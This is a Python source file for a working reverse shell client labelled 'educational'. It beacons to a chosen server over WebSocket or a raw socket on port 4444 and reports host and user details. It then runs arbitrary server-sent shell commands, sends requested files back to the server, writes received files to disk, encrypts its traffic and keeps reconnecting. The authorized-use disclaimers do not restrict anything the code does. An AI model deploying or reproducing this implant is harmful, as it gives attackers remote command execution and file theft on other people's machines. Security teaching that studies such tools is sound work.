#!/usr/bin/env python3
"""
Educational Reverse Shell Client

🚨 EDUCATIONAL CYBERSECURITY TOOL 🚨
⚠️  Use only for authorized educational purposes and cybersecurity learning!

This client demonstrates reverse shell concepts for educational purposes including:
- Socket programming and network connections
- Command execution and response handling
- File transfer capabilities with encryption
- Persistence and reconnection mechanisms
- Stealth techniques for educational analysis

AUTHORIZED USES ONLY:
- Educational coursework and cybersecurity learning
- Authorized penetration testing on your own systems
- Academic research and internship projects
- Controlled environment testing

By using this tool, you acknowledge responsible and legal use only.
"""

import socket
import subprocess
import threading
import time
import json
import base64
import os
import sys
import platform
import getpass
from pathlib import Path
from cryptography.fernet import Fernet
import websocket
import rel
import uuid
from datetime import datetime

class EducationalReverseShellClient:
    def __init__(self, server_host="localhost", server_port=None, server_url=None):
        """
        Initialize the educational reverse shell client
        
        Args:
            server_host: Server hostname/IP
            server_port: Server port (if using direct socket)
            server_url: WebSocket URL (if using WebSocket connection)
        """
        self.server_host = server_host
        self.server_port = server_port
        self.server_url = server_url
        self.client_id = f"{platform.node()}_{getpass.getuser()}_{str(uuid.uuid4())[:8]}"
        self.encryption_key = None
        self.cipher_suite = None
        self.ws = None
        self.running = True
        
        # Client information
        self.client_info = {
            "hostname": platform.node(),
            "username": getpass.getuser(),
            "platform": platform.system(),
            "architecture": platform.architecture()[0],
            "python_version": platform.python_version(),
            "current_directory": os.getcwd(),
            "client_id": self.client_id
        }
        
        print("🚨 Educational Reverse Shell Client Initialized")
        print("⚠️  Educational tool for authorized cybersecurity learning only!")
        print(f"📊 Client ID: {self.client_id}")
        print(f"🖥️  System: {self.client_info['platform']} {self.client_info['architecture']}")
        print(f"👤 User: {self.client_info['username']}@{self.client_info['hostname']}")

    def connect_websocket(self):
        """Connect to server using WebSocket"""
        try:
            if not self.server_url:
                # Default to local WebSocket URL for educational purposes
                self.server_url = f"ws://{self.server_host}:8001/ws/client/{self.client_id}"
            
            print(f"🔌 Attempting WebSocket connection to: {self.server_url}")
            
            # Create WebSocket connection
            self.ws = websocket.WebSocketApp(
                self.server_url,
                on_open=self.on_open,
                on_message=self.on_message,
                on_error=self.on_error,
                on_close=self.on_close
            )
            
            # Start the WebSocket connection
            self.ws.run_forever(dispatcher=rel, reconnect=3)
            rel.signal(2, rel.abort)  # Keyboard interrupt
            rel.dispatch()
            
        except Exception as e:
            print(f"❌ WebSocket connection failed: {str(e)}")
            time.sleep(5)
            if self.running:
                print("🔄 Attempting to reconnect...")
                self.connect_websocket()

    def on_open(self, ws):
        """WebSocket connection opened"""
        print("✅ Connected to Educational CyberSec Platform")
        
        # Send client information
        client_data = {
            "type": "client_info",
            "data": self.client_info,
            "timestamp": datetime.utcnow().isoformat()
        }
        
        ws.send(json.dumps(client_data))

    def on_message(self, ws, message):
        """Handle incoming messages from server"""
        try:
            # Try to parse as JSON first (for welcome message)
            data = json.loads(message)
            
            if data.get("type") == "welcome":
                print(f"🎓 {data.get('message', 'Welcome message received')}")
                
                # Extract encryption key
                self.encryption_key = data.get("encryption_key", "").encode()
                if self.encryption_key:
                    self.cipher_suite = Fernet(self.encryption_key)
                    print("🔐 Encryption established")
                
                # Send heartbeat
                self.send_heartbeat()
                
                return
                
        except json.JSONDecodeError:
            # Message is likely encrypted
            pass
        
        # Handle encrypted messages
        if self.cipher_suite:
            try:
                # Decode and decrypt message
                encrypted_data = base64.b64decode(message.encode())
                decrypted_data = self.cipher_suite.decrypt(encrypted_data)
                command_data = json.loads(decrypted_data.decode())
                
                # Handle different types of commands
                if command_data.get("type") == "command":
                    self.execute_command(command_data.get("command", ""))
                    
                elif command_data.get("type") == "file_transfer":
                    self.handle_file_transfer(command_data)
                    
            except Exception as e:
                print(f"❌ Error processing encrypted message: {str(e)}")

    def on_error(self, ws, error):
        """Handle WebSocket errors"""
        print(f"❌ WebSocket error: {error}")

    def on_close(self, ws, close_status_code, close_msg):
        """Handle WebSocket connection close"""
        print("🔌 Connection closed")
        if self.running:
            print("🔄 Attempting to reconnect in 5 seconds...")
            time.sleep(5)
            self.connect_websocket()

    def execute_command(self, command):
        """Execute a command and send response back to server"""
        print(f"🎯 Executing command: {command}")
        
        start_time = time.time()
        
        try:
            if command.lower().strip() == "exit":
                self.running = False
                output = "Client disconnecting..."
                
            elif command.lower().strip().startswith("cd "):
                # Handle directory change
                try:
                    new_dir = command[3:].strip()
                    os.chdir(new_dir)
                    output = f"Changed directory to: {os.getcwd()}"
                except Exception as e:
                    output = f"Error changing directory: {str(e)}"
                    
            elif command.lower().strip() == "pwd":
                output = os.getcwd()
                
            elif command.lower().strip() == "info":
                # Return system information
                output = json.dumps(self.client_info, indent=2)
                
            else:
                # Execute system command
                try:
                    result = subprocess.run(
                        command,
                        shell=True,
                        capture_output=True,
                        text=True,
                        timeout=30  # 30 second timeout for safety
                    )
                    
                    output = result.stdout
                    if result.stderr:
                        output += f"\nSTDERR:\n{result.stderr}"
                    
                    if not output.strip():
                        output = "Command executed successfully (no output)"
                        
                except subprocess.TimeoutExpired:
                    output = "Command timed out (30 second limit)"
                except Exception as e:
                    output = f"Command execution error: {str(e)}"
                    
        except Exception as e:
            output = f"Error: {str(e)}"
            
        execution_time = time.time() - start_time
        
        # Send response back to server
        response_data = {
            "type": "command_response",
            "original_command": command,
            "output": output,
            "execution_time": execution_time,
            "timestamp": datetime.utcnow().isoformat()
        }
        
        self.send_encrypted_message(response_data)
        
        if command.lower().strip() == "exit":
            self.ws.close()

    def handle_file_transfer(self, transfer_data):
        """Handle file upload/download operations"""
        transfer_type = transfer_data.get("transfer_type")
        filename = transfer_data.get("filename")
        
        print(f"📁 File transfer request: {transfer_type} - {filename}")
        
        try:
            if transfer_type == "upload":
                # Upload file from client to server
                if os.path.exists(filename):
                    with open(filename, 'rb') as file:
                        file_content = file.read()
                        encoded_content = base64.b64encode(file_content).decode()
                        
                        response_data = {
                            "type": "file_response",
                            "filename": filename,
                            "file_data": encoded_content,
                            "file_size": len(file_content),
                            "status": "success",
                            "message": f"File {filename} uploaded successfully"
                        }
                else:
                    response_data = {
                        "type": "file_response",
                        "filename": filename,
                        "status": "error",
                        "message": f"File {filename} not found"
                    }
                    
            elif transfer_type == "download":
                # Download file from server to client
                file_data = transfer_data.get("file_data", "")
                
                try:
                    file_content = base64.b64decode(file_data.encode())
                    
                    # Save file (add prefix to avoid overwriting)
                    safe_filename = f"downloaded_{filename}"
                    with open(safe_filename, 'wb') as file:
                        file.write(file_content)
                        
                    response_data = {
                        "type": "file_response",
                        "filename": filename,
                        "status": "success",
                        "message": f"File saved as {safe_filename}"
                    }
                except Exception as e:
                    response_data = {
                        "type": "file_response",
                        "filename": filename,
                        "status": "error",
                        "message": f"Error saving file: {str(e)}"
                    }
                    
            self.send_encrypted_message(response_data)
            
        except Exception as e:
            error_response = {
                "type": "file_response",
                "filename": filename,
                "status": "error",
                "message": f"File transfer error: {str(e)}"
            }
            self.send_encrypted_message(error_response)

    def send_encrypted_message(self, data):
        """Send encrypted message to server"""
        if self.cipher_suite and self.ws:
            try:
                # Encrypt and encode message
                message_json = json.dumps(data)
                encrypted_data = self.cipher_suite.encrypt(message_json.encode())
                encoded_data = base64.b64encode(encrypted_data).decode()
                
                self.ws.send(encoded_data)
                
            except Exception as e:
                print(f"❌ Error sending encrypted message: {str(e)}")

    def send_heartbeat(self):
        """Send periodic heartbeat to server"""
        def heartbeat_thread():
            while self.running and self.ws:
                try:
                    heartbeat_data = {
                        "type": "heartbeat",
                        "timestamp": datetime.utcnow().isoformat(),
                        "status": "alive"
                    }
                    self.send_encrypted_message(heartbeat_data)
                    time.sleep(30)  # Send heartbeat every 30 seconds
                except:
                    break
                    
        thread = threading.Thread(target=heartbeat_thread, daemon=True)
        thread.start()

    def connect_socket(self):
        """Alternative: Connect using traditional socket (for educational comparison)"""
        print(f"🔌 Connecting to {self.server_host}:{self.server_port} via socket...")
        
        while self.running:
            try:
                # Create socket connection
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.connect((self.server_host, self.server_port))
                
                print("✅ Socket connection established")
                
                # Send initial client info
                sock.send(json.dumps(self.client_info).encode())
                
                while self.running:
                    # Receive command
                    command = sock.recv(1024).decode().strip()
                    
                    if not command:
                        break
                        
                    if command.lower() == "exit":
                        break
                        
                    # Execute command
                    try:
                        if command.lower().startswith("cd "):
                            os.chdir(command[3:].strip())
                            output = f"Changed to: {os.getcwd()}"
                        else:
                            result = subprocess.run(command, shell=True, capture_output=True, text=True)
                            output = result.stdout + result.stderr
                            
                        if not output:
                            output = "Command executed (no output)"
                            
                    except Exception as e:
                        output = f"Error: {str(e)}"
                    
                    # Send response
                    sock.send(output.encode())
                    
            except Exception as e:
                print(f"❌ Socket connection error: {str(e)}")
                time.sleep(5)
                
            finally:
                try:
                    sock.close()
                except:
                    pass

def main():
    """Main function with educational configuration options"""
    print("="*70)
    print("🚨 EDUCATIONAL REVERSE SHELL CLIENT")
    print("⚠️  For authorized cybersecurity learning only!")
    print("="*70)
    
    # Configuration options for educational purposes
    if len(sys.argv) > 1:
        server_host = sys.argv[1]
    else:
        # Default to localhost for educational safety
        server_host = "localhost"
    
    # For educational purposes, show multiple connection methods
    print("\n📚 Available connection methods for learning:")
    print("1. WebSocket connection (modern, real-time)")
    print("2. Traditional socket connection (classic approach)")
    
    connection_method = input("\nSelect connection method (1/2) [default: 1]: ").strip()
    
    client = EducationalReverseShellClient(server_host=server_host)
    
    if connection_method == "2":
        # Traditional socket method
        port = input("Enter server port [default: 4444]: ").strip()
        try:
            client.server_port = int(port) if port else 4444
            client.connect_socket()
        except ValueError:
            print("❌ Invalid port number")
            return
    else:
        # WebSocket method (default)
        server_url = input(f"Enter WebSocket URL [default: ws://{server_host}:8001/ws/client/{{client_id}}]: ").strip()
        if server_url:
            client.server_url = server_url.replace("{client_id}", client.client_id)
            
        client.connect_websocket()

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n🛑 Educational session ended by user")
    except Exception as e:
        print(f"\n❌ Unexpected error: {str(e)}")
        print("📚 This is normal in educational environments - check server connection")